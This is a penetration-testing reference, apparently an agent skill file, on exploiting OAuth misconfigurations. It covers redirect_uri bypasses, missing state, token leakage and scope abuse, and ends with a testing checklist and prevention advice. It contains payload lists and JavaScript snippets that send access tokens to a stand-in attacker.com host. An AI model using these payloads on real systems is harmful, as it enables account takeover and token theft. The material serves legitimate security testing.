---
name: oauth
description: OAuth misconfiguration exploitation - redirect_uri, state bypass, token theft. Use for OAuth flow testing.
---

# OAuth Misconfiguration

## Description
OAuth is an authorization framework that enables applications to obtain limited access to user accounts. Misconfigurations in OAuth implementations can lead to account takeover, token theft, and unauthorized access to protected resources.

## OAuth 2.0 Flow Overview

### Authorization Code Flow
```
1. User clicks "Login with Provider"
2. App redirects to: provider.com/auth?
      client_id=APP_ID&
      redirect_uri=https://app.com/callback&
      response_type=code&
      scope=email&
      state=RANDOM_STATE
3. User authenticates and grants permissions
4. Provider redirects to: app.com/callback?code=AUTH_CODE&state=RANDOM_STATE
5. App exchanges code for access_token
6. App uses access_token to access user data
```

## Vulnerability Categories

### 1. Redirect URI Manipulation

#### Open Redirect via redirect_uri
```
# Original
https://oauth.provider.com/auth?
    client_id=APP_ID&
    redirect_uri=https://app.com/callback&
    response_type=code

# Attack - redirect to attacker
https://oauth.provider.com/auth?
    client_id=APP_ID&
    redirect_uri=https://attacker.com/steal&
    response_type=code
```

#### Subdomain Takeover
```
redirect_uri=https://abandoned.app.com/callback
# If abandoned subdomain can be claimed, token is stolen
```

#### Path Traversal
```
redirect_uri=https://app.com/callback/../../../attacker.com
redirect_uri=https://app.com/callback/../../evil
```

#### URL Parsing Bypass
```
# Bypass domain validation
redirect_uri=https://app.com@attacker.com
redirect_uri=https://app.com%40attacker.com
redirect_uri=https://attacker.com#.app.com
redirect_uri=https://attacker.com?.app.com
redirect_uri=https://app.com.attacker.com
redirect_uri=https://attackerapp.com
```

### 2. State Parameter Issues

#### Missing State Parameter (CSRF)
```
# No state = vulnerable to CSRF
https://oauth.provider.com/auth?
    client_id=APP_ID&
    redirect_uri=https://app.com/callback&
    response_type=code
    # No state parameter!
```

**Attack:**
1. Attacker initiates OAuth flow
2. Attacker gets authorization code
3. Attacker crafts link: `https://app.com/callback?code=ATTACKER_CODE`
4. Victim clicks link
5. Victim's account linked to attacker's OAuth account

#### Weak State Validation
```
# State is predictable
state=1234
state=user123

# State not tied to session
# App accepts any state value
```

### 3. Token Leakage

#### Referrer Header Leakage
```html
<!-- On callback page, if there's external content -->
<img src="https://attacker.com/pixel.gif">

<!-- Token leaks in Referer header -->
Referer: https://app.com/callback?code=AUTH_CODE&state=STATE
```

#### Token in URL Fragment (Implicit Flow)
```
# Implicit flow returns token in fragment
https://app.com/callback#access_token=TOKEN&token_type=bearer

# Fragment can leak via:
# - Referrer header
# - Browser history
# - JavaScript on page
```

### 4. Scope Manipulation

```
# Request more permissions than needed
https://oauth.provider.com/auth?
    client_id=APP_ID&
    redirect_uri=https://app.com/callback&
    scope=email+profile+admin+delete_account&
    response_type=code
```

### 5. Client Secret Exposure

#### In Mobile Apps
```
# Decompile APK/IPA to find client_secret
# Use jadx, apktool, or similar
```

#### In JavaScript
```javascript
// Client secret in frontend code
const clientSecret = "SUPER_SECRET_KEY";
```

### 6. Authorization Code Reuse

```
# If code can be used multiple times:
1. Attacker intercepts code via MITM
2. Legitimate user exchanges code
3. Attacker also exchanges same code
4. Both get tokens
```

### 7. Token Theft via XSS

```javascript
// Steal token from localStorage
fetch('https://attacker.com/steal?token=' + localStorage.getItem('access_token'));

// Steal from fragment
if (window.location.hash) {
    fetch('https://attacker.com/steal' + window.location.hash);
}
```

## Exploitation Techniques

### Account Takeover via OAuth Linking
```
1. Register account on target app (attacker@evil.com)
2. Link OAuth provider to this account
3. Find victim's OAuth identifier (email, social profile)
4. Manipulate OAuth response to link victim's identity to your account
```

### Pre-Account Takeover
```
1. Target app has OAuth registration
2. Attacker registers with victim's email (unverified)
3. Victim later uses OAuth with same email
4. Account may merge, giving attacker access
```

### Implicit Flow Token Theft
```html
<!-- Attacker page -->
<script>
// Open OAuth in iframe/popup
window.open('https://oauth.provider.com/auth?...');

// Listen for fragment
window.onhashchange = function() {
    // Steal token from hash
    fetch('https://attacker.com/steal' + location.hash);
};
</script>
```

## Testing Checklist

### Redirect URI
- [ ] Test different domains in redirect_uri
- [ ] Test subdomain variations
- [ ] Test URL encoding bypass
- [ ] Test path traversal
- [ ] Test special characters (@, #, ?)
- [ ] Test localhost and IP addresses

### State Parameter
- [ ] Check if state is required
- [ ] Check if state is validated
- [ ] Check if state is tied to session
- [ ] Test CSRF without state

### Tokens
- [ ] Check for token in URL/Referrer
- [ ] Check token storage (localStorage, cookies)
- [ ] Test token reuse
- [ ] Check token expiration
- [ ] Test scope validation

### Client Configuration
- [ ] Look for exposed client secrets
- [ ] Check for proper PKCE implementation
- [ ] Verify response_type validation

## Payloads

### Redirect URI Bypass
```
https://attacker.com
https://app.com@attacker.com
https://app.com%2F%2Fattacker.com
https://app.com/callback/../../../attacker.com
https://app.com/callback?next=https://attacker.com
https://attacker.com/?.app.com
https://attacker.com/#.app.com
https://attacker.com%00.app.com
```

### XSS Payloads for Token Theft
```
redirect_uri=javascript:alert(1)
redirect_uri=data:text/html,<script>alert(1)</script>
redirect_uri=https://app.com/callback#<script>alert(1)</script>
```

## Tools

### Burp Suite
```
- Capture OAuth requests
- Modify redirect_uri
- Test state parameter
- Check for token leakage
```

### OAuth Testing Checklist (Manual)
```bash
# Test redirect_uri variations
for uri in $(cat redirect_uris.txt); do
    curl -s "https://oauth.provider.com/auth?client_id=ID&redirect_uri=$uri" \
        -o /dev/null -w "%{http_code}\n"
done
```

## Prevention

```
1. Strict redirect_uri validation (exact match)
2. Always use and validate state parameter
3. Use Authorization Code flow with PKCE
4. Store tokens securely (HttpOnly cookies)
5. Never expose client secrets
6. Implement proper token expiration
7. Validate scopes server-side
8. Use TLS for all OAuth communications
```

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/OAuth%20Misconfiguration
- https://portswigger.net/web-security/oauth
- https://oauth.net/2/
